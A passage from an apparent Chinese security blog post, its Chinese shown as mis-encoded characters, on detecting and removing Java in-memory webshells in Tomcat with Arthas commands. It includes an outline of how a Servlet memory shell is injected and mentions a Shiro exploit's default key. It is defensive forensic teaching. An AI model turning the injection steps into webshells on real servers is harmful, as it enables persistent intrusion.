args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">MathGame</span> <span class="variable">game</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MathGame</span>();</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            game.run();</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">1L</span>);</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> random.nextInt();</span><br><span class="line">            List&lt;Integer&gt; primeFactors = <span class="built_in">this</span>.primeFactors(number);</span><br><span class="line">            MathGame.print(number, primeFactors);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(String.format(<span class="string">&quot;illegalArgumentCount:%3d, &quot;</span>, <span class="built_in">this</span>.illegalArgumentCount) + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> number, List&lt;Integer&gt; primeFactors)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="string">&quot;&quot;</span> + number + <span class="string">&quot;=&quot;</span>);</span><br><span class="line">        Iterator&lt;Integer&gt; iterator = primeFactors.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">factor</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">            sb.append(factor).append(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sb.charAt(sb.length() - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">            sb.deleteCharAt(sb.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">primeFactors</span><span class="params">(<span class="type">int</span> number)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (number &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            ++<span class="built_in">this</span>.illegalArgumentCount;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;number is: &quot;</span> + number + <span class="string">&quot;, need &gt;= 2&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ArrayList&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= number) &#123;</span><br><span class="line">            <span class="keyword">if</span> (number % i == <span class="number">0</span>) &#123;</span><br><span class="line">                result.add(i);</span><br><span class="line">                number /= i;</span><br><span class="line">                i = <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Affect(row-cnt:<span class="number">1</span>) cost in <span class="number">970</span> ms.</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906204804756.png" alt="image-20250906204804756"></p><h2 id="6-watch"><a href="#6-watch" class="headerlink" title="6. watch"></a>6. watch</h2><p>é€šè¿‡<a href="https://arthas.aliyun.com/doc/watch.html">watch</a>å‘½ä»¤æ¥æŸ¥çœ‹<code>demo.MathGame#primeFactors</code>å‡½æ•°çš„è¿”å›å€¼ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ watch demo.MathGame primeFactors returnObj</span><br><span class="line">Press Ctrl+C to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost <span class="keyword">in</span> 107 ms.</span><br><span class="line">ts=2018-11-28 19:22:30; [cost=1.715367ms] result=null</span><br><span class="line">ts=2018-11-28 19:22:31; [cost=0.185203ms] result=null</span><br><span class="line">ts=2018-11-28 19:22:32; [cost=19.012416ms] result=@ArrayList[</span><br><span class="line">    @Integer[5],</span><br><span class="line">    @Integer[47],</span><br><span class="line">    @Integer[2675531],</span><br><span class="line">]</span><br><span class="line">ts=2018-11-28 19:22:33; [cost=0.311395ms] result=@ArrayList[</span><br><span class="line">    @Integer[2],</span><br><span class="line">    @Integer[5],</span><br><span class="line">    @Integer[317],</span><br><span class="line">    @Integer[503],</span><br><span class="line">    @Integer[887],</span><br><span class="line">]</span><br><span class="line">ts=2018-11-28 19:22:34; [cost=10.136007ms] result=@ArrayList[</span><br><span class="line">    @Integer[2],</span><br><span class="line">    @Integer[2],</span><br><span class="line">    @Integer[3],</span><br><span class="line">    @Integer[3],</span><br><span class="line">    @Integer[31],</span><br><span class="line">    @Integer[717593],</span><br><span class="line">]</span><br><span class="line">ts=2018-11-28 19:22:35; [cost=29.969732ms] result=@ArrayList[</span><br><span class="line">    @Integer[5],</span><br><span class="line">    @Integer[29],</span><br><span class="line">    @Integer[7651739],</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906204856815.png" alt="image-20250906204856815"></p><h2 id="7-é€€å‡º-arthas"><a href="#7-é€€å‡º-arthas" class="headerlink" title="7. é€€å‡º arthas"></a>7. é€€å‡º arthas</h2><p>å¦‚æœåªæ˜¯é€€å‡ºå½“å‰çš„è¿æ¥ï¼Œå¯ä»¥ç”¨<code>quit</code>æˆ–è€…<code>exit</code>å‘½ä»¤ã€‚Attach åˆ°ç›®æ ‡è¿›ç¨‹ä¸Šçš„ arthas è¿˜ä¼šç»§ç»­è¿è¡Œï¼Œç«¯å£ä¼šä¿æŒå¼€æ”¾ï¼Œä¸‹æ¬¡è¿æ¥æ—¶å¯ä»¥ç›´æ¥è¿æ¥ä¸Šã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906204925793.png" alt="image-20250906204925793"></p><p>å¦‚æœæƒ³å®Œå…¨é€€å‡º arthasï¼Œå¯ä»¥æ‰§è¡Œ<code>stop</code>å‘½ä»¤ã€‚</p><h2 id="8-è¿›é˜¶ç©æ³•"><a href="#8-è¿›é˜¶ç©æ³•" class="headerlink" title="8.è¿›é˜¶ç©æ³•"></a>8.è¿›é˜¶ç©æ³•</h2><p><a href="https://killercoda.com/arthas/course/arthas-tutorials-cn">https://killercoda.com/arthas/course/arthas-tutorials-cn</a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906205135408.png" alt="image-20250906205135408"></p><h1 id="å®æ“å®è·µ"><a href="#å®æ“å®è·µ" class="headerlink" title="å®æ“å®è·µ"></a>å®æ“å®è·µ</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>å…ˆç®€å•èµ·ä¸€ä¸ªshirodemoï¼Œ<a href="https://pan.baidu.com/s/13NwfjcerdAACgGbw4qQR5w?pwd=love">ä¸‹è½½åœ°å€</a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906205511360.png"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906205711732.png" alt="image-20250906205711732"></p><p>ç„¶åå†æ‰“ä¸€ä¸‹ç•™ä¸‹ä¸€ä¸ªæ¶æ„Filter</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906205912133.png" alt="image-20250906205912133"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906205844355.png" alt="image-20250906205844355"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906210148642.png" alt="image-20250906210148642"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906210608387.png" alt="image-20250906210608387"></p><h2 id="ä½¿ç”¨-scå‘½ä»¤è¿›è¡Œæ¨¡å¼åŒ¹é…"><a href="#ä½¿ç”¨-scå‘½ä»¤è¿›è¡Œæ¨¡å¼åŒ¹é…" class="headerlink" title="ä½¿ç”¨ scå‘½ä»¤è¿›è¡Œæ¨¡å¼åŒ¹é…"></a>ä½¿ç”¨ <code>sc</code>å‘½ä»¤è¿›è¡Œæ¨¡å¼åŒ¹é…</h2><p>åœ¨ Arthas å‘½ä»¤è¡Œä¸­è¾“å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc *Filter*</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906211621067.png" alt="image-20250906211621067"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906211652392.png" alt="image-20250906211652392"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906211716113.png" alt="image-20250906211716113"></p><p>å®¹æ˜“çœ‹åˆ°ï¼Œå’Œæˆ‘ä»¬å®šä¹‰çš„å¯†ç å¹¶ä¸ä¸€è‡´ï¼Œæ˜¯å› ä¸ºæ­¤å¤„è¿›è¡Œäº†é‡æ–°èµ‹å€¼</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906211834015.png" alt="image-20250906211834015"></p><h2 id="æ ¹æ®ä»£ç è§£å¯†æ•°æ®æµé‡"><a href="#æ ¹æ®ä»£ç è§£å¯†æ•°æ®æµé‡" class="headerlink" title="æ ¹æ®ä»£ç è§£å¯†æ•°æ®æµé‡"></a>æ ¹æ®ä»£ç è§£å¯†æ•°æ®æµé‡</h2><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906214208916.png" alt="image-20250906214208916"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906214004586.png" alt="image-20250906214004586"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906214145830.png" alt="image-20250906214145830"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906213831832.png" alt="image-20250906213831832"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906213908026.png" alt="image-20250906213908026"></p><p>ç™¾åº¦äº†ä¸€ä¸‹è¿™ä¸ªç§˜é’¥æ€ä¹ˆç”Ÿæˆçš„ï¼Œå‘ç°æ˜¯æˆ‘ä»¬ä½¿ç”¨shiroæ‰“å†…å­˜é©¬çš„æ—¶å€™ç»™çš„ä¸€ä¸ªé»˜è®¤çš„å¯†ç pass1024ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906215104215.png" alt="image-20250906215104215"></p><h2 id="æŸ¥çœ‹ç±»å†…å­˜ä¸­çš„å®ä¾‹åŠå…¶å˜é‡å€¼"><a href="#æŸ¥çœ‹ç±»å†…å­˜ä¸­çš„å®ä¾‹åŠå…¶å˜é‡å€¼" class="headerlink" title="æŸ¥çœ‹ç±»å†…å­˜ä¸­çš„å®ä¾‹åŠå…¶å˜é‡å€¼"></a>æŸ¥çœ‹ç±»å†…å­˜ä¸­çš„å®ä¾‹åŠå…¶å˜é‡å€¼</h2><h3 id="é¦–å…ˆæŸ¥æ‰¾ç±»çš„å®ä¾‹å¯¹è±¡"><a href="#é¦–å…ˆæŸ¥æ‰¾ç±»çš„å®ä¾‹å¯¹è±¡" class="headerlink" title="é¦–å…ˆæŸ¥æ‰¾ç±»çš„å®ä¾‹å¯¹è±¡"></a>é¦–å…ˆæŸ¥æ‰¾ç±»çš„å®ä¾‹å¯¹è±¡</h3><p>ä½¿ç”¨ <code>sc</code>å‘½ä»¤æŸ¥çœ‹ç±»çš„è¯¦ç»†ä¿¡æ¯ï¼Œè·å–ç±»çš„ <code>classLoaderHash</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc -d com.summersec.x.BehinderFilter</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç¤ºä¾‹ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906220239465.png" alt="image-20250906220239465"></p><p>è®°ä¸‹ <code>classLoaderHash</code>8575f07ã€‚</p><hr><h3 id="æŸ¥çœ‹ç±»çš„æ‰€æœ‰å®ä¾‹"><a href="#æŸ¥çœ‹ç±»çš„æ‰€æœ‰å®ä¾‹" class="headerlink" title="æŸ¥çœ‹ç±»çš„æ‰€æœ‰å®ä¾‹"></a>æŸ¥çœ‹ç±»çš„æ‰€æœ‰å®ä¾‹</h3><p>ä½¿ç”¨ <code>vmtool</code>å‘½ä»¤è·å–ç±»çš„æ‰€æœ‰å®ä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances -c 8575f07 --className com.summersec.x.BehinderFilter</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906221123904.png" alt="image-20250906221123904"></p><p>è¾“å‡ºä¼šæ˜¾ç¤ºæ‰€æœ‰å®ä¾‹çš„å¯¹è±¡ID</p><hr><h3 id="æŸ¥çœ‹ç‰¹å®šå®ä¾‹çš„å­—æ®µå€¼"><a href="#æŸ¥çœ‹ç‰¹å®šå®ä¾‹çš„å­—æ®µå€¼" class="headerlink" title="æŸ¥çœ‹ç‰¹å®šå®ä¾‹çš„å­—æ®µå€¼"></a>æŸ¥çœ‹ç‰¹å®šå®ä¾‹çš„å­—æ®µå€¼</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances -c 8575f07 --className com.summersec.x.BehinderFilter --express <span class="string">&#x27;instances[0]&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906221103656.png" alt="image-20250906221103656"></p><p>èƒ½çœ‹åˆ°è¿™ä¸ªæ—¶å€™<code>path</code>å°±å·²ç»å¯¹ä¸Šäº†ã€‚</p><h1 id="äº”ç§åŸºç¡€å†…å­˜é©¬æŸ¥æ€"><a href="#äº”ç§åŸºç¡€å†…å­˜é©¬æŸ¥æ€" class="headerlink" title="äº”ç§åŸºç¡€å†…å­˜é©¬æŸ¥æ€"></a>äº”ç§åŸºç¡€å†…å­˜é©¬æŸ¥æ€</h1><p>ç°åœ¨å·²ç»ä¼šåŸºç¡€ä½¿ç”¨äº†ï¼Œå¯ä»¥è¿›è¡Œå†…å­˜é©¬çš„æŸ¥æ€äº†</p><p>ä¸‹é¢äº”ç§åŸºç¡€å†…å­˜é©¬ï¼Œéƒ½æ˜¯åŸºäºè¯¥æ–‡ç« ä¸­å®ç°çš„<a href="https://xz.aliyun.com/news/18301">https://xz.aliyun.com/news/18301</a></p><p>å¤ç°ä»£ç <a href="https://github.com/y1shiny1shin/servletDemo%EF%BC%8Ctomcat">https://github.com/y1shiny1shin/servletDemoï¼Œtomcat</a> 8.5.31ï¼Œjdk 8.202</p><h2 id="Serlvet-å†…å­˜é©¬"><a href="#Serlvet-å†…å­˜é©¬" class="headerlink" title="Serlvet å†…å­˜é©¬"></a>Serlvet å†…å­˜é©¬</h2><p>åŸºç¡€<code>Servlet</code>é©¬çš„é€»è¾‘ï¼Œæ˜¯æ–°å»ºä¸€ä¸ª<code>Wrapper</code>ä¹‹åï¼Œå°†<code>æ¶æ„Servlet</code>ç”¨<code>Wrapper</code>åŒ…è£…ï¼Œå†å†™å…¥åˆ°StandardContextã€‚</p><p>å¦‚æœæˆ‘ä»¬æƒ³è¦å†™ä¸€ä¸ªServletå†…å­˜é©¬ï¼Œéœ€è¦ç»è¿‡ä»¥ä¸‹æ­¥éª¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. æ‰¾åˆ°StandardContext</span><br><span class="line">2. ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„servlet</span><br><span class="line">3. åˆ›å»ºWapperå¯¹è±¡</span><br><span class="line">4. è®¾ç½®Servletçš„LoadOnStartUpçš„å€¼</span><br><span class="line">5. è®¾ç½®Servletçš„Name</span><br><span class="line">6. è®¾ç½®Servletå¯¹åº”çš„Class</span><br><span class="line">7. å°†Servletæ·»åŠ åˆ°contextçš„childrenä¸­</span><br><span class="line">8. å°†urlè·¯å¾„å’Œservletç±»åšæ˜ å°„</span><br></pre></td></tr></table></figure><p>é¦–å…ˆç›´æ¥åˆ æ‰Servletå¯¹è±¡è‚¯å®šæ˜¯ä¸å¯å–çš„ï¼Œå¦‚æœæ˜¯æŠ¥é”™å¤„ç†ä¸å¤ªè¡Œçš„ç³»ç»Ÿï¼Œç›´æ¥åˆ å¯¹è±¡å¯èƒ½æœåŠ¡ç›´æ¥å°±å´©äº†ï¼› </p><p>é‚£ä¹ˆæˆ‘ä»¬è¿›å…¥<code>StandardContext</code>ä¸­ï¼Œåˆ†æä¸€ä¸‹<code>addChild</code>å’Œ<code>addServletMappingDecoded</code>æ˜¯æ€ä¹ˆä¸ªé€»è¾‘ï¼›</p><p>å»æ‰ä¸€äº›æŠ¥é”™å¤„ç†çš„ä»£ç ä¹‹åçš„æ ¸å¿ƒä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// addChildæ ¸å¿ƒä»£ç </span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isJspServlet</span> <span class="operator">=</span> <span class="string">&quot;jsp&quot;</span>.equals(child.getName());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allow webapp to override JspServlet inherited from global web.xml.</span></span><br><span class="line"><span class="keyword">if</span> (isJspServlet) &#123;</span><br><span class="line">    oldJspServlet = (Wrapper) findChild(<span class="string">&quot;jsp&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (oldJspServlet != <span class="literal">null</span>) &#123;</span><br><span class="line">        removeChild(oldJspServlet);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">super</span>.addChild(child);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isJspServlet &amp;&amp; oldJspServlet != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The webapp-specific JspServlet inherits all the mappings</span></span><br><span class="line"><span class="comment">     * specified in the global web.xml, and may add additional ones.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    String[] jspMappings = oldJspServlet.findMappings();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; jspMappings!=<span class="literal">null</span> &amp;&amp; i&lt;jspMappings.length; i++) &#123;</span><br><span class="line">        addServletMappingDecoded(jspMappings[i], child.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//addServletMappingDecoded</span></span><br><span class="line"><span class="type">String</span> <span class="variable">adjustedPattern</span> <span class="operator">=</span> adjustURLPattern(pattern);</span><br><span class="line"></span><br><span class="line"><span class="keyword">synchronized</span> (servletMappingsLock) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name2</span> <span class="operator">=</span> servletMappings.get(adjustedPattern);</span><br><span class="line">    <span class="keyword">if</span> (name2 != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Don&#x27;t allow more than one servlet on the same pattern</span></span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) findChild(name2);</span><br><span class="line">        wrapper.removeMapping(adjustedPattern);</span><br><span class="line">    &#125;</span><br><span class="line">    servletMappings.put(adjustedPattern, name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) findChild(name);</span><br><span class="line">wrapper.addMapping(adjustedPattern);</span><br><span class="line"></span><br><span class="line">fireContainerEvent(<span class="string">&quot;addServletMapping&quot;</span>, adjustedPattern);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¾ˆæ˜æ˜¾çš„ï¼Œ<code>addServletMappingDecoded</code>ä¸­çš„<code>servletMapping</code>å°†<code>servletPath</code>å’Œ<code>servletName</code>è¿›è¡Œäº†ç»‘å®šï¼›</p><p>é‚£ä¹ˆè¿è¡Œç¯å¢ƒä¹‹åï¼Œè®¿é—®<a href="http://127.0.0.1:8082/servletDemo_war_exploded/injectServlet%EF%BC%8C%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%88%90%E5%8A%9F%E4%B9%8B%E5%90%8E">http://127.0.0.1:8082/servletDemo_war_exploded/injectServletï¼Œæ‰§è¡Œå‘½ä»¤æˆåŠŸä¹‹å</a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907015052546.png" alt="image-20250907015052546"></p><p>ä½¿ç”¨Arthasè¿æ¥åˆ°è¿›ç¨‹ä¸­ï¼Œè·å–åˆ°<code>StandardContext</code>å…ˆ</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907022007955.png" alt="image-20250907022007955"></p><p>é‚£ä¹ˆé€‰æ‹©åˆ°ç¬¬äºŒä¸ª</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907022115960.png" alt=""></p><p>è¿™æ ·å°±å¯ä»¥è·å–åˆ°è¯¥ç±»äº†ï¼Œé‚£ä¹ˆç°åœ¨éœ€è¦è·å–åˆ°ç±»ä¸­çš„<code>servletMapping</code></p><p>è¿™æ˜¯æ³¨å…¥å†…å­˜é©¬ä¹‹å‰ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907022256742.png" alt="image-20250907022256742"></p><p>æ³¨å…¥å†…å­˜é©¬ä¹‹åã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907022416847.png" alt="image-20250907022416847"></p><p>å…¶å®ä¸€çœ¼å°±èƒ½çœ‹å‡ºæ¥execè¿™ä¸ªè·¯ç”±æ˜¯æ¶æ„çš„ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„<code>servletMappings</code>æ˜¯hashmapï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥å°è¯•<code>remove</code>æ‰è¿™ä¸ªè·¯ç”±</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907022704324.png" alt="image-20250907022704324"></p><p>å‘ç°è¿˜æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907022805037.png" alt="image-20250907022805037"></p><p>é‚£ä¹ˆè¯´æ˜ç›´æ¥åˆ è·¯ç”±å¹¶ä¸èƒ½ç›´æ¥å¯¼è‡´æœ¨é©¬å¤±æ•ˆï¼Œé‚£ä¹ˆå†æ‰¾ä¸€ä¸‹ä»£ç </p><p>éå¸¸çš„å¹¸è¿ï¼Œæ‰¾åˆ°äº†</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907022927478.png" alt="image-20250907022927478"></p><p>é‚£ä¹ˆæ—¢ç„¶è¿™é‡Œå°è£…å¥½äº†ç§»é™¤servletçš„æ–¹æ³•ï¼Œç›´æ¥è°ƒç”¨è¯•è¯•çœ‹</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907023100245.png" alt="image-20250907023100245"></p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œå¦‚æœä½ æ˜¯åˆ é™¤äº†<code>servletMappings</code>ä¸­çš„<code>/exec</code>ä¹‹åï¼Œå†æ‰§è¡Œ<code>removeServletMapping</code>çš„è¯ï¼Œé‚£ä¹ˆä»£ç å°†ä¸ä¼šæ‰§è¡Œ<code>wrapper.removeMapping(pattern);</code></p><p>å› ä¸º<code>HashMap</code>ä¸­çš„<code>remove</code>æ–¹æ³•ï¼Œä¼šè¿”å›<code>key</code>å¯¹åº”çš„<code>value</code>å€¼</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250714012828052.png" alt="img"></p><p>é‚£ä¹ˆå¦‚æœ<code>remove</code>ä¹‹åï¼Œåœ¨<code>remove</code>çš„è¯ï¼Œå°±ä¼šè¿”å›<code>null</code></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250714013000090.png" alt="img"></p><p><code>name=null</code>ï¼Œé‚£ä¹ˆ<code>wrapper=null</code>ï¼Œifè¯­å¥å°±ä¸ä¼šæ‰§è¡Œ</p><p>é‚£å¦‚æœè¯´ï¼Œæ‰‹è´±ä¸å°å¿ƒremoveäº†å‘¢ï¼Œè¿˜æœ‰è¡¥æ•‘æ–¹æ³•å—ï¼Ÿ</p><p>è¡¥æ•‘æ–¹æ³•å°±æ˜¯å†æ‰‹åŠ¨æ‰§è¡Œä¸€é<code>removeMapping</code>æ–¹æ³•å°±å¯ä»¥äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express <span class="string">&#x27;instances[1].findChild(&quot;execServlet&quot;).removeMapping(&quot;/exec&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907024339597.png" alt="image-20250907024339597"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907024547988.png" alt="image-20250907024547988"></p><h2 id="Listener-å†…å­˜é©¬"><a href="#Listener-å†…å­˜é©¬" class="headerlink" title="Listener å†…å­˜é©¬"></a>Listener å†…å­˜é©¬</h2><p>è¿™ç±»å†…å­˜é©¬åç®€å•ï¼Œæ–°å»ºä¸€ä¸ªç»§æ‰¿äº†<code>javax.servlet.ServletRequestListener</code>çš„æ¶æ„<code>Listener</code>ï¼Œå†æŠŠæ¶æ„<code>Listener</code>ç»™æ·»åŠ åˆ°<code>StandardContext</code>ä¸­</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907150150055.png" alt="image-20250907150150055"></p><p>çœ‹èµ·æ¥åªæ˜¯ç®€å•çš„æ·»åŠ 